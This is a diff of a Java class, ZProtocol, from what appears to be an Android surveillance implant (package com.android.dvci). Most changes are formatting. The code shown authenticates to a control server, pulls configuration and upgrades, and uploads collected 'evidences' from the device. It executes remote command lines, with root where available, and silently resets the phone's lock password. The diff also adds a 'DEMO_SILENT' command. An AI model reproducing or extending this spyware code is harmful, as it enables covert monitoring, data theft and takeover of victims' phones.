@@ -9,19 +9,12 @@
 
 package com.android.dvci.action.sync;
 
-import java.io.IOException;
-import java.security.NoSuchAlgorithmException;
-import java.security.SecureRandom;
-import java.util.Date;
-import java.util.Vector;
-
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 
 import com.android.dvci.Core;
 import com.android.dvci.Device;
-import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.crypto.CryptoException;
@@ -42,29 +35,49 @@ import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
+import java.io.IOException;
+import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
+import java.util.Date;
+import java.util.Vector;
+
 import static com.android.dvci.capabilities.PackageInfo.checkRoot;
 
 /**
  * The Class ZProtocol.
  */
 public class ZProtocol extends Protocol {
-	/** The debug. */
+	/**
+	 * The debug.
+	 */
 	private static final String TAG = "ZProtocol"; //$NON-NLS-1$
-	/** The Constant SHA1LEN. */
+	/**
+	 * The Constant SHA1LEN.
+	 */
 	private static final int SHA1LEN = 20;
-	/** The crypto k. */
+	/**
+	 * The crypto k.
+	 */
 	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
 
-	/** The crypto conf. */
+	/**
+	 * The crypto conf.
+	 */
 	private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();
 
-	/** The Kd. */
+	/**
+	 * The Kd.
+	 */
 	byte[] Kd = new byte[16];
 
-	/** The Nonce. */
+	/**
+	 * The Nonce.
+	 */
 	byte[] Nonce = new byte[16];
 
-	/** The upgrade files. */
+	/**
+	 * The upgrade files.
+	 */
 	Vector<String> upgradeFiles = new Vector<String>();
 
 	/**
@@ -89,7 +102,9 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
-	/** The random. */
+	/**
+	 * The random.
+	 */
 	SecureRandom random;
 
 	/*
@@ -120,10 +135,10 @@ public class ZProtocol extends Protocol {
 
 			if (Status.self().wantsReload()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (perform) ");
+					Check.log(TAG + " (perform) reloading conf");
 				}
 				Core.self().reloadConf();
-			}else{
+			} else {
 				checkRoot();
 			}
 
@@ -176,12 +191,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Authentication.
-	 * 
+	 *
 	 * @return true if uninstall
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
 	 */
 	private boolean authentication() throws TransportException, ProtocolException {
 		if (Cfg.DEBUG) {
@@ -215,12 +228,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Identification.
-	 * 
+	 *
 	 * @return the boolean[]
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
 	 */
 	private boolean[] identification() throws TransportException, ProtocolException {
 		if (Cfg.DEBUG) {
@@ -245,15 +256,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * New conf.
-	 * 
-	 * @param cap
-	 *            the cap
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @param cap the cap
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void newConf(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
@@ -287,15 +294,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Download.
-	 * 
-	 * @param cap
-	 *            the cap
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @param cap the cap
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void download(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
@@ -306,15 +309,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Upload.
-	 * 
-	 * @param cap
-	 *            the cap
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @param cap the cap
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void upload(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
@@ -331,15 +330,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Upgrade.
-	 * 
-	 * @param cap
-	 *            the cap
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @param cap the cap
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void upgrade(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
@@ -364,15 +359,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Filesystem.
-	 * 
-	 * @param cap
-	 *            the cap
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @param cap the cap
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void filesystem(final boolean cap) throws TransportException, ProtocolException, CommandException {
 		if (cap) {
@@ -396,13 +387,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Evidences.
-	 * 
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void evidences() throws TransportException, ProtocolException, CommandException {
 		if (Cfg.DEBUG) {
@@ -415,13 +403,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * End.
-	 * 
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
+	 *
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
+	 * @throws CommandException   the command exception
 	 */
 	private void end() throws TransportException, ProtocolException, CommandException {
 		if (Cfg.DEBUG) {
@@ -432,9 +417,10 @@ public class ZProtocol extends Protocol {
 	}
 
 	// **************** PROTOCOL **************** //
+
 	/**
 	 * Forge authentication.
-	 * 
+	 *
 	 * @return the byte[]
 	 */
 	protected byte[] forgeAuthentication() {
@@ -490,12 +476,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the authentication.
-	 * 
-	 * @param authResult
-	 *            the auth result
+	 *
+	 * @param authResult the auth result
 	 * @return true if uninstall
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
 		if (authResult == null) {
@@ -571,7 +555,7 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Forge identification.
-	 * 
+	 *
 	 * @return the byte[]
 	 */
 	protected byte[] forgeIdentification() {
@@ -605,12 +589,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the identification.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return the boolean[]
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected boolean[] parseIdentification(final byte[] result) throws ProtocolException {
 		final boolean[] capabilities = new boolean[Proto.LASTTYPE];
@@ -701,16 +683,12 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the new conf.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return false if error loading new conf, true if no conf or conf read
-	 *         correct
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 * @throws CommandException
-	 *             the command exception
-	 * 
+	 * correct
+	 * @throws ProtocolException the protocol exception
+	 * @throws CommandException  the command exception
 	 */
 	protected int parseNewConf(final byte[] result) throws ProtocolException, CommandException {
 		final int res = ByteArray.byteArrayToInt(result, 0);
@@ -765,11 +743,9 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the download.
-	 * 
-	 * @param result
-	 *            the result
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 *
+	 * @param result the result
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected void parseDownload(final byte[] result) throws ProtocolException {
 		final int res = ByteArray.byteArrayToInt(result, 0);
@@ -818,12 +794,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the upload.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return true if left>0
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected boolean parseUpload(final byte[] result) throws ProtocolException {
 
@@ -884,12 +858,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the upgrade.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return true, if successful
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected boolean parseUpgrade(final byte[] result) throws ProtocolException {
 
@@ -952,11 +924,9 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the file system.
-	 * 
-	 * @param result
-	 *            the result
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 *
+	 * @param result the result
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected void parseFileSystem(final byte[] result) throws ProtocolException {
 		final int res = ByteArray.byteArrayToInt(result, 0);
@@ -1016,7 +986,7 @@ public class ZProtocol extends Protocol {
 				ret = dpm.resetPassword("", 0);
 			}
 		}
-		res.stdout.add( (ret?"OK RESET":"NO RESET") );
+		res.stdout.add((ret ? "OK RESET" : "NO RESET"));
 		return res;
 	}
 
@@ -1038,15 +1008,18 @@ public class ZProtocol extends Protocol {
 					ExecuteResult ret;
 					if (executionLine.equals(M.e("RESET_PASSWORD"))) {
 						ret = resetPassword();
+						ret.saveEvidence();
+					} else if (executionLine.equals(M.e("DEMO_SILENT"))) {
+						Cfg.DEMO_SILENT = true;
 					} else {
 						if (Status.self().haveRoot()) {
 							ret = Execute.executeRoot(executionLine);
 						} else {
 							ret = Execute.execute(executionLine);
 						}
+						ret.saveEvidence();
 					}
 
-					ret.saveEvidence();
 				}
 
 			} catch (final IOException e) {
@@ -1086,7 +1059,7 @@ public class ZProtocol extends Protocol {
 
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i); // per reverse:
-															// dsize-i-1
+			// dsize-i-1
 			final String[] logs = logCollector.scanForEvidences(basePath, dir);
 
 			final int lsize = logs.length;
@@ -1122,13 +1095,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Send evidences.
-	 * 
-	 * @param basePath
-	 *            the base path
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 *
+	 * @param basePath the base path
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
 	 */
 	protected void sendEvidences(final String basePath) throws TransportException, ProtocolException {
 		if (Cfg.DEBUG) {
@@ -1145,7 +1115,7 @@ public class ZProtocol extends Protocol {
 
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i); // per reverse:
-															// dsize-i-1
+			// dsize-i-1
 			final String[] logs = logCollector.scanForEvidences(basePath, dir);
 
 			final int lsize = logs.length;
@@ -1340,12 +1310,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the log.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return true, if successful
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected boolean parseLog(final byte[] result) throws ProtocolException {
 		return checkOk(result);
@@ -1353,12 +1321,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the log.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return true, if successful
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected int parseLogOffset(final byte[] result) throws ProtocolException {
 		if (checkOk(result)) {
@@ -1373,27 +1339,23 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Parses the end.
-	 * 
-	 * @param result
-	 *            the result
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 *
+	 * @param result the result
+	 * @throws ProtocolException the protocol exception
 	 */
 	protected void parseEnd(final byte[] result) throws ProtocolException {
 		checkOk(result);
 	}
 
 	// ****************************** INTERNALS ***************************** //
+
 	/**
 	 * Command.
-	 * 
-	 * @param command
-	 *            the command
+	 *
+	 * @param command the command
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws TransportException the transport exception
+	 * @throws ProtocolException  the protocol exception
 	 */
 	private byte[] command(final int command) throws TransportException, ProtocolException {
 		return command(command, new byte[0]);
@@ -1401,14 +1363,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Command.
-	 * 
-	 * @param command
-	 *            the command
-	 * @param data
-	 *            the data
+	 *
+	 * @param command the command
+	 * @param data    the data
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
+	 * @throws TransportException the transport exception
 	 */
 	private byte[] command(final int command, final byte[] data) throws TransportException {
 		if (Cfg.DEBUG) {
@@ -1440,14 +1399,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Cyphered write read.
-	 * 
-	 * @param plainOut
-	 *            the plain out
+	 *
+	 * @param plainOut the plain out
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws TransportException the transport exception
+	 * @throws CryptoException    the crypto exception
 	 */
 	private byte[] cypheredWriteRead(final byte[] plainOut) throws TransportException, CryptoException {
 		final byte[] cypherOut = cryptoK.encryptData(plainOut);
@@ -1458,14 +1414,11 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Cyphered write read sha.
-	 * 
-	 * @param plainOut
-	 *            the plain out
+	 *
+	 * @param plainOut the plain out
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws TransportException the transport exception
+	 * @throws CryptoException    the crypto exception
 	 */
 	private byte[] cypheredWriteReadSha(final byte[] plainOut) throws TransportException, CryptoException {
 		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
@@ -1486,12 +1439,10 @@ public class ZProtocol extends Protocol {
 
 	/**
 	 * Check ok.
-	 * 
-	 * @param result
-	 *            the result
+	 *
+	 * @param result the result
 	 * @return true, if successful
-	 * @throws ProtocolException
-	 *             the protocol exception
+	 * @throws ProtocolException the protocol exception
 	 */
 	private boolean checkOk(final byte[] result) throws ProtocolException {
 		final int res = ByteArray.byteArrayToInt(result, 0);
